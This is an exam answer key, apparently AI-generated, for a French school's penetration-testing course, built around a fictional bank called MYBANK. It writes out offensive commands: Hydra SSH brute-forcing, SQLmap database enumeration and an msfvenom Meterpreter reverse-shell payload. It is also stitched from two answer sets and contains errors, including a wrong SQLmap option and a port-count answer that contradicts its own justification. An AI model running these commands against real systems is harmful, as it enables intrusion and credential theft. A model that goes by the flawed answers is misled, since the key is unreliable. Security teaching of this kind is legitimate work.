![[Pasted image 20250531133940.png]]
![[Pasted image 20250531133928.png]]
![[Pasted image 20250531133914.png]]

Below is a detailed solution for the exam from École Supérieure Privée Technologies & Ingénierie, covering both the multiple-choice questions (Partie 1) and the open-ended questions (Partie 2). The solutions are provided with justifications and examples based on standard penetration testing practices, tools, and methodologies relevant to the context of the exam.

---

### Partie 1: 10 points (une seule réponse est correcte pour chaque question)

#### Q1: Le nombre des ports TCP/IP dans l’IPv4 est :
- **Options:** A. 1023, B. 10000, C. 49152, D. 65535
- **Correct Answer:** D. 65535
- **Justification:** In IPv4, the total number of TCP/IP ports is 65,536 (ranging from 0 to 65,535). This is because port numbers are represented by 16 bits, allowing for 2^16 possible values.

#### Q2: Quel outil de collecte d’informations vous donnera des informations sur le système d’exploitation d’un serveur Web ?
- **Options:** A. NSlookup, B. DNS lookup, C. Tracert, D. Netcraft
- **Correct Answer:** D. Netcraft
- **Justification:** Netcraft is a tool that provides detailed information about web servers, including the operating system, web server software (e.g., Apache, Nginx), and other technologies in use. NSlookup and DNS lookup are for DNS queries, while Tracert is for tracing network paths.

#### Q3: Quel type de scan correspond à un paquet avec tous les « flags » égaux à 1 ?
- **Options:** A. Full Open Scan, B. SYN Scan, C. XMAS Scan, D. TCP Connect Scan
- **Correct Answer:** C. XMAS Scan
- **Justification:** An XMAS scan (performed with Nmap using `-sX`) sets all TCP flags (FIN, PSH, URG) to 1, making the packet look "lit up like a Christmas tree." This scan is used to detect open or filtered ports based on the response (or lack thereof).

#### Q4: Quel est le numéro de port RDP ?
- **Options:** A. 137, B. 3389, C. 443, D. 445
- **Correct Answer:** B. 3389
- **Justification:** RDP (Remote Desktop Protocol) uses port 3389 by default on Windows systems for remote desktop connections.

#### Q5: « Banner grabbing » est un exemple de ?
- **Options:** A. Passive Operating System fingerprinting, B. Active Operating System fingerprinting
- **Correct Answer:** B. Active Operating System fingerprinting
- **Justification:** Banner grabbing involves actively connecting to a service (e.g., via Telnet or Netcat) to retrieve its banner, which often reveals the OS or service version (e.g., `telnet 192.168.1.1 80`). This is an active technique because it directly interacts with the target.

#### Q6: Quelle est la séquence correcte d’une connexion TCP ?
- **Options:** A. SYN-ACK-SYN ACK, B. SYN-ACK-FIN, C. SYN, SYN-ACK, ACK, D. SYN-PSH-ACK
- **Correct Answer:** C. SYN, SYN-ACK, ACK
- **Justification:** The correct TCP three-way handshake sequence is:
  - Client sends SYN.
  - Server responds with SYN-ACK.
  - Client sends ACK to complete the connection.

Here are the corrected and organized answers for the TEK-UP cybersecurity quiz questions, incorporating the clarifications (e.g., SQLMAP for Q1 and the adjusted phrasing for Q3). Each question is listed with its answer and detailed explanation for clarity.

---

#### Q7: En utilisant SQLMAP, si vous souhaitez analyser et tester tous les formulaires d'une page web, quelle option devez-vous utiliser?
- A: -forms-all  
- B: -forms-all  
- C: -data  

**Answer:** A: -forms-all  
**Explanation:** SQLMAP is a tool used for SQL injection testing. The `-forms-all` option instructs SQLMAP to analyze and test all forms on a web page for vulnerabilities, ensuring a comprehensive scan of form inputs. The repeated option "B: -forms-all" appears to be a typo, and "C: -data" is not a relevant option for this task in SQLMAP.

---

#### Q8: Quel outil permettra d’effectuer le « footprinting » sans être détecté?
- A: Recherche Whois  
- B: Traceoute  
- C: Ping sweep  
- D: Host Scanning  

**Answer:** A: Recherche Whois  
**Explanation:** Footprinting is the initial step in gathering information about a target system or network. A Whois lookup (Recherche Whois) retrieves domain registration details (e.g., IP addresses, owner info) from public databases without directly interacting with the target, minimizing detection risk. Active techniques like traceroute, ping sweep, and host scanning send packets to the target, which can be logged and detected.

---

#### Q9: Dans le cas XMAS scan (envoi de FIN PSH URG), la réponse de la machine par RST signifie que le port est ouvert:
- A: Vrai  
- B: Faux  

**Answer:** B: Faux  
**Explanation:** An XMAS scan sends TCP packets with FIN, PSH, and URG flags set. If the port is closed, the target machine responds with a RST (reset) packet to reject the connection attempt. If the port is open, the machine typically does not respond or silently drops the packet. Therefore, a RST response indicates a closed port, not an open one, making the statement false.

---

#### Q10: Qu’est-ce que signifie l’élévation de privilèges?
- A: L’élévation d’un compte utilisateur avec des privilèges plus élevés  
- B: Forcer des identifiants d’un utilisateur  

**Answer:** A: L’élévation d’un compte utilisateur avec des privilèges plus élevés  
**Explanation:** Elevation of privileges refers to increasing a user's access rights, such as escalating from a standard user to an administrator, to gain more control over a system. This is a common goal in security testing or attacks. Option B, forcing credentials, is unrelated to the concept of privilege elevation.

---

### Partie 2: 10 points

#### Scénario:
Vous êtes un expert en sécurité informatique chargé de réaliser un test d’intrusion sur le réseau d’une entreprise fictive, MYBANK.

---

#### Question 1:

##### Q1.1: Quelle méthode utiliseriez-vous pour collecter des informations sur le réseau de MYBANK avant de commencer le test d’intrusion ?
- **Solution:** Use a combination of passive and active reconnaissance techniques.
  - **Passive Reconnaissance:** Gather information without interacting with the target.
    - Use tools like **Whois** to retrieve domain registration details: `whois mybank.com`
    - Use **Shodan** to find exposed devices: `shodan search org:MYBANK`
    - Use **TheHarvester** to collect emails and subdomains: `theharvester -d mybank.com -l 500 -b google`
  - **Active Reconnaissance:** Directly interact with the target network.
    - Perform an Nmap scan to discover live hosts: `nmap -sn 192.168.1.0/24`
    - Use Netcraft to identify web server details: Visit `netcraft.com` and search for MYBANK.
- **Justification:** Passive methods reduce the risk of detection, while active methods provide more detailed information (e.g., live hosts, open ports).

##### Q1.2: Citer un exemple de deux outils que vous utilisez dans cette phase.
- **Solution:**
  - **TheHarvester:** For gathering emails and subdomains: `theharvester -d mybank.com -l 500 -b google`
  - **Shodan:** For finding internet-facing devices: `shodan search org:MYBANK`
- **Justification:** These tools are effective for reconnaissance, providing a broad range of information without initially alerting the target.

---

#### Question 2:

##### Q2.1: Donner la différence entre le scan et l’énumération.
- **Solution:**
  - **Scanning:** Identifies live hosts, open ports, and services running on a network. It’s a broad, initial step to map the attack surface.
    - Example: `nmap -sS 192.168.1.0/24` (SYN scan to find live hosts and open ports).
  - **Enumeration:** Gathers detailed information about specific services, users, or resources on the target. It’s a deeper step following scanning.
    - Example: `enum4linux -a 192.168.1.10` (Enumerates SMB shares and users).
- **Justification:** Scanning provides a high-level overview, while enumeration extracts actionable details for exploitation.

##### Q2.2: Donner un exemple de deux outils utilisés dans cette phase.
- **Solution:**
  - **Nmap:** For scanning: `nmap -A 192.168.1.10` (Aggressive scan for OS and service detection).
  - **Enum4linux:** For enumeration: `enum4linux -a 192.168.1.10` (SMB enumeration).
- **Justification:** Nmap is ideal for scanning, while Enum4linux provides detailed SMB information, a common target in enterprise networks.

---

#### Question 3:

##### Q3.1: Donner deux outils utilisés pour le crack des mots de passe.
- **Solution:**
  - **Hydra:** For brute-forcing passwords: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh`
  - **John the Ripper:** For cracking hashes: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- **Justification:** Hydra is effective for online brute-forcing (e.g., SSH, HTTP), while John is suited for offline hash cracking (e.g., NTLM, SHA).

---

#### Question 4:

##### Q4.1: Donner un outil utilisé pour le sniffing.
- **Solution:**
  - **Wireshark:** A network protocol analyzer for capturing and analyzing packets.
    - Usage: Launch Wireshark, select an interface (e.g., eth0), and filter packets (e.g., `http` to capture HTTP traffic).
- **Justification:** Wireshark is widely used for sniffing, allowing detailed packet analysis to identify sensitive data like credentials.

##### Q4.2: Dans quel mode doit être votre carte réseau pour accepter tout le trafic reçu ?
- **Solution:** Promiscuous Mode.
- **Justification:** In promiscuous mode, the network interface captures all traffic on the network, not just packets addressed to it, which is essential for sniffing.

---

#### Question 5:

##### Q5.1: Donner la commande pour compléter l’exploit.
- **Solution:** Assuming an exploit is set up in Metasploit:
  ```bash
  exploit
  ```
- **Justification:** After configuring a Metasploit module (e.g., `set RHOSTS 192.168.1.10`), the `exploit` command executes the attack.

##### Q5.2: Définir le terme « system hardening ».
- **Solution:** System hardening is the process of securing a system by reducing its attack surface, such as disabling unnecessary services, applying security patches, enforcing strong password policies, and configuring firewalls.
- **Justification:** Hardening minimizes vulnerabilities, making it harder for attackers to exploit the system.

---

#### Question 6:

##### Q6.1: Donner l’outil de scan des vulnérabilités spécifique pour chacun de ces CMS.
- **Solution:**
  - **Drupal:** Use **Droopescan**.
    - Command: `droopescan scan drupal -u http://mybank.com`
  - **Joomla:** Use **Joomscan**.
    - Command: `joomscan -u http://mybank.com`
- **Justification:** Droopescan and Joomscan are specialized tools for scanning vulnerabilities in Drupal and Joomla CMS platforms, respectively.

---

#### Question 7:

##### Q7.1: Donner les étapes de configuration du navigateur pour utiliser le proxy.
- **Solution:**
  - Open the browser (e.g., Firefox).
  - Go to Settings > Network Settings.
  - Select "Manual proxy configuration."
  - Set the HTTP Proxy to `127.0.0.1` and Port to `8080` (default for Burp Suite).
  - Enable "Use this proxy server for all protocols."
  - Save and ensure Burp Suite is running.
- **Justification:** This configures the browser to route traffic through Burp Suite for intercepting and analyzing web requests.

##### Q7.2: Quel est le module dans Burp Suite utilisé pour la brute force des formulaires web ?
- **Solution:** Intruder.
- **Justification:** Burp Suite’s Intruder module is used for brute-forcing web forms by automating requests with different payloads (e.g., username/password lists).

---

#### Question 8:

##### Q8.1: Quel outil automatisé peut-on utiliser pour l’exploitation de la vulnérabilité d’injection SQL ?
- **Solution:** SQLmap.
  - Command: `sqlmap -u "http://mybank.com/index.php?id=1" --dbs`
- **Justification:** SQLmap automates the exploitation of SQL injection vulnerabilities, enumerating databases, tables, and data.

##### Q8.2: Que doit-on fournir à cet outil pour réussir l’exploitation de cette vulnérabilité ?
- **Solution:** A vulnerable URL with an injection point.
  - Example: `http://mybank.com/index.php?id=1` (where `id` is injectable).
- **Justification:** SQLmap requires a URL with a parameter vulnerable to SQL injection to test and exploit.

---

#### Question 9:

##### Q9.1: Quels sont les avantages d’un Meterpreter ?
- **Solution:**
  - Runs in memory, avoiding disk detection.
  - Provides an interactive shell for post-exploitation.
  - Supports advanced features like file uploads/downloads, privilege escalation, and credential harvesting (e.g., `hashdump`).
- **Justification:** Meterpreter’s in-memory execution and robust feature set make it a powerful tool for penetration testers.

##### Q9.2: Quel est le nom de l’outil sous Kali qui permet de créer des payloads personnalisés ?
- **Solution:** Msfvenom.
  - Command: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe`
- **Justification:** Msfvenom is a Metasploit tool for generating custom payloads, such as reverse shells.

---

#### Question 10:

##### Q10.1: Quels seraient vos conseils pour renforcer la sécurité du réseau et des systèmes MYBANK après avoir identifié ces vulnérabilités ?
- **Solution:**
  - **Patch Management:** Regularly update CMS (Drupal, Joomla) and other software to fix known vulnerabilities.
  - **Firewall Configuration:** Restrict open ports (e.g., block RDP port 3389 if not needed).
  - **Strong Password Policies:** Enforce complex passwords and use multi-factor authentication (MFA).
  - **Network Segmentation:** Isolate critical systems to limit lateral movement.
  - **Monitoring:** Implement intrusion detection systems (e.g., Snort) to detect suspicious activity.
  - **Disable Unnecessary Services:** Turn off unused services (e.g., FTP if not needed).
  - **Encrypt Data:** Use HTTPS and secure protocols for data transmission.
- **Justification:** These measures address common vulnerabilities, reducing the attack surface and enhancing MYBANK’s security posture.
